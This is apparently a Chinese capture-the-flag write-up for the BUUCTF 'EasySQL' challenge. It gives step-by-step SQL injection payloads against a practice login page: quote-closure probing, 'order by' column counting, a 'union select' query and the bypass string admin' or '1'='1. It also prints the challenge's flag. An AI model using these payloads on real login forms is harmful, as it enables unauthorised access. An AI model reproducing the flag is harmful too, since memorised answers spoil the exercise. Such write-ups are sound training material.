# [[极客大挑战 2019]EasySQL](https://buuoj.cn/challenges)

### 

### 0x00判断注入点



发现通过修改URL可以影响到SQL语句的判断



在`password`参数附近存在注入



```sql
http://xxx.cn:81/check.php?username=wda&password=
```



### 0x01判断闭合符号



在`username=`处加闭合符“	’  ”进行测试



```sql
http://xxx.cn:81/check.php?username=‘admin&password=1111
```



测试结果



```sql
You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near 'admin' and password='1111'' at line 1
```



发现闭合处在`password=`附近



0x02使用order by子句 判断字段数



```sql
http://xxx.cn:81/check.php?username=admin&password='order by 1,2,3 %23
```



判断出此页面的列为3个



### 0x03使用联合查询 union select 



```sql
http://xxx.cn:81/check.php?username=admin&password='union select 1,2,3 %23
```





**直接查出答案**



```
flag{69d90fcc-0fc1-447d-bbb2-6cce2e30bdc1}
```



### 0x04补充说明



admin 为管理员用户



**万能密码，闭合双引号?username=admin&password=admin' or '1'='1**



作者

SihUi
